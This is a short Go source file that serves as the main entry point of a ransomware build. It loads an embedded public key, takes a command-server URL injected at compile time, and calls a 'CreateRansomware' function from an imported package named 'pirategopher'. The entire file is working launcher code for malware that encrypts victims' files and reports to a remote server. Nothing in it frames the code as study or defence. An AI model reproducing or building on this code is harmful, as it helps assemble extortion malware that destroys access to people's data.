package main

import (
	"flag"
	"github.com/spitfire55/pirategopher"
	"log"
)

var (
	// inject at compile time w/ linker vars
	ServerUrl string
)

//go:generate embed -c "embed.json"

func main() {
	flag.Parse()
	pubKey, err := Asset("public.pem")
	if err != nil {
		log.Fatal(err)
	}
	pirategopher.CreateRansomware(ServerUrl, pubKey)
}